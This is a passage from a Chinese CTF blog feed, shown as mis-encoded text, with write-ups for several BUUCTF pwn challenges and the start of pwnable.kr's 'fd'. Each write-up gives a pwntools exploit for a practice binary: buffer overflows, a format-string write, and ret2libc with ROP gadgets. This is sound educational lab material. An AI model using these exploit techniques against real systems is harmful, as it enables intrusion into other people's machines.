class="comment">#è¿™é‡Œå°±è¦p32äº†floatæ˜¯å››å­—èŠ‚,å…¶å®p64ä¹Ÿè¡Œåªä¸è¿‡ä¼šè¦†ç›–åˆ°è¿”å›åœ°å€</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>ä¿æŠ¤åªå¼€nx</p><p>idaæŸ¥çœ‹</p><p>å‘ç°æ˜¯c++ä»£ç ,æˆ‘è¿™åŠæ¡¶æ°´è¯»èµ·æ¥æœ‰ç‚¹åƒåŠ›</p><p>ç›´æ¥è¿è¡Œçœ‹çœ‹,å‘ç°è¾“å…¥Iä¼šè¢«æ›¿æ¢ä¸ºyou,è¿™æ ·ä¸€ä¸ªIèƒ½å¡«å……ä¸‰ä¸ªå­—èŠ‚å°±å¯ä»¥åšåˆ°æº¢å‡ºçš„æ•ˆæœäº†</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¯»ä¸€è¯»æºç </p><ol><li><p>fgets(s, 32, edata) ,edataå…¶å®ä¹Ÿå°±æ˜¯stdinäº†</p></li><li><p>ä½¿ç”¨ <code>std::string::operator=</code> å°† <code>s</code> ä¸­çš„å†…å®¹èµ‹å€¼ç»™åä¸º <code>input</code> çš„ <code>std::string</code> å¯¹è±¡ã€‚</p></li><li>ä½¿ç”¨ <code>std::allocator&lt;char&gt;::allocator</code> åˆ›å»ºäº†ä¸€ä¸ª <code>std::allocator&lt;char&gt;</code> å¯¹è±¡ï¼Œå¹¶å°†å…¶åœ°å€ä¼ é€’ç»™ <code>v5</code> å˜é‡ã€‚</li><li>ä½¿ç”¨ <code>std::string::string</code> æ„é€ äº†ä¸€ä¸ª <code>std::string</code> å¯¹è±¡ <code>v4</code>ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸² â€œyouâ€ã€‚</li><li>ä½¿ç”¨ <code>std::allocator&lt;char&gt;::allocator</code> åˆ›å»ºäº†å¦ä¸€ä¸ª <code>std::allocator&lt;char&gt;</code> å¯¹è±¡ï¼Œå¹¶å°†å…¶åœ°å€ä¼ é€’ç»™ <code>v7</code> å˜é‡ã€‚</li><li>ä½¿ç”¨ <code>std::string::string</code> æ„é€ äº†å¦ä¸€ä¸ª <code>std::string</code> å¯¹è±¡ <code>v6</code>ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸² â€œIâ€ã€‚</li><li>è°ƒç”¨ <code>replace()</code> å‡½æ•°ï¼Œå°† <code>input</code> å¯¹è±¡ä¸­çš„å­å­—ç¬¦ä¸² â€œIâ€ æ›¿æ¢ä¸ºå­—ç¬¦ä¸² â€œyouâ€.</li><li>ä½¿ç”¨ <code>std::string::operator=</code> å°† <code>v3</code> å˜é‡ä¸­çš„å­—ç¬¦ä¸²å†…å®¹èµ‹å€¼ç»™ <code>input</code> å¯¹è±¡ï¼Œå¹¶åœ¨ <code>v6</code> å’Œ <code>v4</code> çš„å¸®åŠ©ä¸‹æ„é€ äº†ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚</li><li>è°ƒç”¨ <code>std::string</code> å’Œ <code>std::allocator</code> çš„ææ„å‡½æ•°æ¥é‡Šæ”¾å·²åˆ†é…çš„å†…å­˜ã€‚</li><li>å°† <code>input</code> ä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° <code>s</code> å˜é‡ä¸­ã€‚</li><li>ä½¿ç”¨ <code>printf()</code> å‡½æ•°æ‰“å°æœ€ç»ˆç»“æœ</li></ol><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x40059A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h1><p>ä¿æŠ¤æŸ¥ä¸€æŸ¥ï¼Œå¼€å¯äº†nxä¸canary</p><p>idaçœ‹ä¸€çœ‹ï¼Œç¡®å®šä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210019.png" alt=""></p><p>ç¬¬ä¸€æƒ³æ³•æ˜¯dword_804c044æœ‰å‡ºç°åœ¨å‚æ•°ä¸­,é‚£ä¹ˆæ ˆä¸­èƒ½æ‰¾åˆ°èƒ½æ‰¾åˆ°å®ƒ,å¯ä»¥æ³„éœ²å…¶ä¸­çš„æ•°æ®,å†è¾“å…¥ä»¥é€šè¿‡</p><p>ä¸è¿‡gdbè°ƒè¯•å‘ç°readåçš„æ ˆä¸­å®ƒçš„åœ°å€å·²ç»è¢«è¦†ç›–äº†,</p><p>é‚£å°±åªèƒ½é€‰æ‹©ä»»æ„åœ°å€å†™äº†</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210719.png" alt=""></p><p><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°</strong>,é‚£ä¹ˆè¾“å…¥å†…å®¹çš„ç›¸å¯¹åç§»æ˜¯10</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;%12$nxxx&#x27;</span>+p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>æ£€æŸ¥ä¿æŠ¤,åªå¼€äº†nx</p><p>idaåæ±‡ç¼–,ç¨‹åºä¸ºä¸€ä¸ªèœå•å¼ç¨‹åº</p><p>æ²¡æœ‰systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²</p><p>åŸºæœ¬ç¡®å®šä¸ºlibcæ³„éœ²ç±»é¢˜</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_212742.png" alt=""></p><p>å±é™©å‡½æ•°å¦‚ä¸Š</p><p>è¿™ä¸ªå¾ªç¯ä¼šä¿®æ”¹æˆ‘ä»¬çš„è¾“å…¥ä½†æ˜¯æœ‰å¯ä»¥è·³è¿‡çš„åŠæ³•,å³v0ä¸€å®šæ˜¯ä¸€ä¸ªå¤§äºé›¶çš„æ•°,åˆ™åªè¦payloadå¼€å¤´ä¸º<strong>\x00</strong>å°±è¡Œäº†</p><p><strong>exp</strong>å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">e=ELF(<span class="string">&#x27;./12&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">padding=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span> <span class="comment">#è¿™é‡Œè„‘æŠ½ï¼Œ0x50æ¢ç®—æˆäº†åè¿›åˆ¶ï¼Œå¡«çš„æ—¶å€™åˆåŠ äº†0xï¼Œè¢«æŠ¥é”™æŠ˜ç£¨äº†åŠä¸ªå°æ—¶æ‰å‘ç°ï¼Œæˆ‘å¥½èœ</span></span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)   <span class="comment">#putsè‡ªå¸¦æ¢è¡Œ</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#64ä½å‡½æ•°çœŸå®åœ°å€ä¸€èˆ¬åªå 6ä¸ªå­—èŠ‚ï¼Œä¸”æœ€é«˜ä½ä¸º&#x27;\x7f&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#å¯ä»¥é€‰æ‹©ç”¨Lincsearcheræ¥ç›´æ¥pwntoolsä¸­æ“ä½œï¼Œä½†æˆ‘è¿˜æ˜¯é€‰æ‹©ç”¨libcdatabaseè¿™ä¸ªç½‘ç«™æŸ¥è¯¢è·å¾—åœ°å€</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system)) <span class="comment">#è¿™é‡Œæœ‰ä¸ªæ ˆå¯¹é½ï¼Œä¸‹é¢è¯´ä¸€è¯´</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> è¡¥å……ä¸€ä¸ªå¯èƒ½æ‰€æœ‰äººéƒ½çŸ¥é“ä½†æˆ‘åšè¿™é“é¢˜æ‰è®¤çœŸæ€è€ƒäº†çš„é—®é¢˜ </summary>              <div class='content'>              <p>å³ELF.symbol,ELF.plt,ELF.gotçš„ä½¿ç”¨åŒºåˆ†</p><p>ELF.pltå¾—åˆ°çš„pltçš„åœ°å€,ELF.pltçš„å†…å®¹é¦–é¡¹æ˜¯ELF.gotçš„åœ°å€,ELF.gotçš„å†…å®¹æ˜¯å‡½æ•°çš„çœŸå®åŠ è½½åœ°å€</p><p>ELF.pltå†…å®¹æŒ‡å‘ELF.gotçš„åœ°å€,å½“éœ€è¦è®¿é—®å‡½æ•°çš„çœŸå®åŠ è½½åœ°å€å°±éœ€è¦è®¿é—®ELF.gotå†…å®¹,ä½†åŠ¨æ€é“¾æ¥ä¸‹,åˆå§‹ELF.goté¡¹å¿…ç„¶ä¸æ˜¯å‡½æ•°çœŸå®åœ°å€,ä¸”è®¿é—®ELF.gotåˆéœ€è¦è®¿é—®ELF.plt</p><p>å¦å¤–ELF.pltä¸€å®šèƒ½è¿›å…¥å‡½æ•°,ELF.gotåˆ™ä¸ä¸€å®š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-25_211747.png" alt=""></p><p>ä½¿ç”¨å“ªä¸ª,åˆ™è¦çœ‹éœ€è¦è®¿é—®çš„å†…å®¹,è¦å®ç°ä»€ä¹ˆç›®çš„</p><p>å†æ¥çœ‹symbolså’Œpltçš„ä½¿ç”¨åœºåˆ</p><p>è¿™ä¸¤ä¸ªå¾ˆå¤šæ—¶å€™è¿”å›æ˜¯ç›¸åŒçš„(å·®ä¸å¤šå¯ä»¥å½“ä½œä¸€ä¸ªç”¨äº†,åƒè¿™é¢˜,puts_plt=e.symbols[â€˜putsâ€™ä¹Ÿæ˜¯å¯ä»¥çš„])</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF.symbolsé€‚ç”¨åœºæ™¯ï¼š</span><br><span class="line">æŸ¥æ‰¾ç‰¹å®šç¬¦å·çš„åœ°å€ï¼Œä¾‹å¦‚å‡½æ•°çš„å…¥å£åœ°å€ã€å…¨å±€å˜é‡çš„åœ°å€ç­‰ã€‚</span><br><span class="line">æšä¸¾å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ‰€æœ‰ç¬¦å·ï¼Œä¾‹å¦‚æšä¸¾æ‰€æœ‰å¯¼å‡ºå‡½æ•°ã€‚ä¼˜å…ˆè€ƒè™‘PLTæ¡ç›®ï¼Œè€Œä¸æ˜¯GOTæ¡ç›®ã€‚</span><br><span class="line">ELF.plté€‚ç”¨åœºæ™¯ï¼š</span><br><span class="line">æŸ¥æ‰¾éœ€è¦åŠ¨æ€é“¾æ¥çš„å‡½æ•°çš„å…¥å£åœ°å€ï¼Œä¾‹å¦‚ä¸ºè°ƒç”¨æŸä¸ªå‡½æ•°è¿›è¡ŒROPæ”»å‡»æ—¶ã€‚</span><br><span class="line">æšä¸¾éœ€è¦åŠ¨æ€é“¾æ¥çš„å‡½æ•°ï¼Œä¾‹å¦‚æšä¸¾å¯æ‰§è¡Œæ–‡ä»¶ä¾èµ–çš„æ‰€æœ‰å…±äº«åº“ä¸­çš„å¯¼å‡ºå‡½æ•°ã€‚</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> å› ä¸ºä¸ä¸¥è°¨å¯¼è‡´é—®é¢˜çš„ç»†èŠ‚ </summary>              <div class='content'>              <p>å…¶å®å°±æ˜¯ä¸€äº›å°ç»†èŠ‚</p><ol><li>sendå’Œsendlineçš„ä½¿ç”¨,å¤§å¤šæ•°æ—¶å€™äºŒè€…æ²¡æœ‰å·®åˆ«,ä½†æ˜¯è¯¸å¦‚é‡åˆ°äº†getchar(),gets()è¿™äº›å‡½æ•°,å°±åªèƒ½ç”¨sendline(æˆ–è€…sendè‡ªå·±åŠ \n)äº†,å› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°ä¸æ¥æ”¶åˆ°\nå°±ä¸ä¼šç»§ç»­æ‰§è¡Œ,å¯¼è‡´ç¨‹åºçš„æ‰§è¡Œå¡ä½,ä¸èƒ½å¾€ä¸‹æ‰§è¡Œ</li><li>putså‡½æ•°è¾“å‡ºæ—¶ä¼šè‡ªå¸¦\n,æ¥æ”¶æ—¶è¦æ³¨æ„</li></ol>              </div>            </details><details class="folding-tag" green><summary> æ ˆå¯¹é½ </summary>              <div class='content'>              <p>è¯´èµ·æ¥å…¶å®ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿,å°±æ˜¯åœ¨x86_64çš„ä¸€äº›ç¯å¢ƒä¸‹,<strong>systemå‡½æ•°</strong>åœ°å€åœ¨æ ˆä¸­çš„å­˜æ”¾åœ°å€,è¦åˆšå¥½æ˜¯16çš„æ•´æ•°å€,ä¾‹å¦‚å¦‚æœæœ€åä¸¤ä½æ˜¯a8,åˆ™ä¼šæŠ¥é”™timeout: the monitored command dumped core,å°±è¦é€šè¿‡æ ˆå¯¹é½ä½¿ä¹‹å˜ä¸ºb0,ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡å‰é¢æ”¾ä¸€ä¸ªæ— åŠŸèƒ½gadget(å³ret)æ¥å¡«å……ä½¿æ ˆå¯¹é½</p>              </div>            </details><p><strong>è¿™é¢˜å…¶å®æ˜¯ç¬¬ä¸€é¢˜æˆ‘è‡ªå·±åšå‡ºæ¥çš„libcæ³„éœ²ç±»é¢˜ç›®,è™½ç„¶ä¹‹å‰æ¥è§¦è¿‡ä¸å°‘,ä½†éƒ½æ²¡æœ‰å®æ“,äº²è‡ªåšäº†ä¸€é,æ”¶è·å¾ˆå¤§</strong></p><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>idaä¸€çœ‹,å°±æ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡Œè¾“å…¥,ç¬¬14ä¸ªå…ƒç´ å¦‚æœç­‰äº17åˆ™æ‹¿åˆ°shell</p><p>å”¯ä¸€å€¼å¾—æ³¨æ„çš„å°±æ˜¯</p><p><code>if ( *(_QWORD *)&amp;var[13] )</code>å°†dwordæŒ‡é’ˆå˜ä¸ºäº†qwordæŒ‡é’ˆ,æ‰€ä»¥ç¬¬15ä¸ªå…ƒç´ å¾—ç•™ç©º,ä¸è¿‡ä»¥é˜²ä¹‹å‰æ ˆä¸­å­˜ç•™äº†ä¸€äº›æ•°æ®,ä¹Ÿå¯ä»¥ç”¨p64æ‰“åŒ…ç›´æ¥è¦†ç›–</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26449</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="number">0x0</span>)*<span class="number">13</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¥½å‡ æ¬¡é‡åˆ°äº†åŒä¸€ä¸ªé—®é¢˜,è¿›å…¥shellæ¨¡å¼å,ç¬¬ä¸€æ¡æŒ‡ä»¤æ°¸è¿œæ²¡æœ‰è¾“å‡º,è™½ç„¶æ— ä¼¤å¤§é›…,ä¸”å¹¶ä¸æ˜¯æ¯é¢˜éƒ½è¿™æ ·,ä½†å¼ºè¿«ç—‡å¾ˆéš¾å—å•Š</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>ä¿æŠ¤åªå¼€äº†nx</p><p>idaæŸ¥çœ‹æœ‰systemå‡½æ•°,è€Œä¸”èƒ½æ‰¾åˆ°åˆ°binshå­—ç¬¦ä¸²</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">system=<span class="number">0x0804845C</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span>+p32(system)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>å¸¸è§„å…¥é—¨é¢˜</p><p>åªä¸è¿‡readå­—ç¬¦æ•°ç”±è‡ªå·±è¾“å…¥</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">p.recv()</span><br><span class="line">backdoor=<span class="number">0x4006EA</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>æ ‡å‡†æµç¨‹å°±ä¸é‡å¤äº†,è¿™é¢˜å•çœ‹é¢˜ä¸éš¾,ä½†å‘æ˜¯ä¸€ä¸ªæ¥ç€ä¸€ä¸ª</p><p>ç¬¬ä¸€ä¸ªå‘,idaæ˜¾ç¤ºçš„v4è·è¿”å›åœ°å€è®¡ç®—å‡ºæ¥åº”è¯¥æ˜¯60,ä½†æ˜¯å®é™…å»gdbè°ƒè¯•ä¼šå‘ç°åº”è¯¥æ˜¯56,ä¹‹å‰åšäº†é‚£ä¹ˆå¤šé¢˜éƒ½æ˜¯ç›´æ¥ç”¨idaç»™çš„æ•°æ®,è¿™æ¬¡çªç„¶è·³å‡ºæ¥ä¸€ä¸ªä¸å‡†çš„ç¡®å®å¾ˆæäººï¼ˆä¸»è¦è¿™é¢˜æ ˆå¸§ä¸æ˜¯å¸¸è§çš„ç±»å‹ï¼‰,ä¹Ÿç®—å¾—åˆ°äº†ä¸€ä¸ªæ•™è®­,æœ€å¥½è¿˜æ˜¯gdbå®æ“è®¡ç®—åç§»,å½“ç„¶ç›´æ¥å»è¯»æ±‡ç¼–ä»£ç ä¹Ÿèƒ½å¾—å‡ºæ­£ç¡®ç»“æœ</p><p>ç¬¬äºŒä¸ªå¤§å‘,å°±æ˜¯è¿™é¢˜æ²¡æœ‰è®¾ç½®setbuf(stdoutï¼Œ0)ï¼Œæ‰€ä»¥æœ¬é¢˜çš„è¾“å‡ºæ˜¯ç¼“å­˜åœ¨æœåŠ¡å™¨æœ¬åœ°çš„ï¼Œæ¢å¥è¯è¯´ï¼šå¦‚æœç¨‹åºä¸æ­£å¸¸é€€å‡ºï¼Œæœ¬åœ°æ˜¯ä¸ä¼šæœ‰è¾“å‡ºçš„,æ‰€ä»¥å¿…é¡»è¦æ­£å¸¸é€€å‡º,å…¶å®è¿™ä¹Ÿåº”è¯¥æ˜¯ç¬¬ä¸€é¢˜æˆ‘æ²¡èƒ½æ¥æ”¶ä¿¡æ¯å¡ä½çš„åŸå› </p><p>æ›´å¤šå¯è§åŸºç¡€æ‚çƒ©ç¯‡</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27423</span>)</span><br><span class="line">backdoor=<span class="number">0x080489A0</span></span><br><span class="line">exit= <span class="number">0x0804E6A0</span>  <span class="comment">#å¾ˆé‡è¦</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(backdoor)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å°å¿ƒå†å°å¿ƒ</summary>
    
    
    
    <category term="é¢˜è§£" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kråˆ·é¢˜è®°å½•-1</title>
    <link href="https://ixout.github.io/posts/4569/"/>
    <id>https://ixout.github.io/posts/4569/</id>
    <published>2023-03-20T13:46:51.000Z</published>
    <updated>2023-03-27T06:13:44.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>sshè¿ä¸Šä¹‹åï¼Œlså‘ç°ä¸‰ä¸ªæœ‰æ•ˆæ–‡ä»¶fd,fd.c,flag</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_220727.png" alt=""></p><p>flagæ²¡æœ‰ä»»ä½•æƒé™å‘æˆ‘ä»¬å¼€æ”¾</p><p>å†çœ‹fd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç é—®é¢˜ä¸å¤§,è€ƒéªŒçš„å°±æ˜¯å¯¹linuxç³»ç»Ÿreadå‡½æ•°æœ€åŸºæœ¬çš„äº†è§£äº†,0æ˜¯æ ‡å‡†è¾“å…¥,ä½¿fdä¸º0å³å¯,0x1234è½¬æ¢ä¸ºåè¿›åˆ¶å³æ˜¯4660</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br></pre></td></tr></table></figure><ul><li>atoi()ï¼šatoi()å‡½æ•°ä¼šæ‰«æå‚æ•° str å­—ç¬¦ä¸²ï¼Œè·³è¿‡å‰é¢çš„ç©ºç™½å­—ç¬¦ï¼ˆä¾‹å¦‚ç©ºæ ¼ï¼Œtab ç¼©è¿›ç­‰ï¼Œå¯ä»¥é€šè¿‡ isspace() 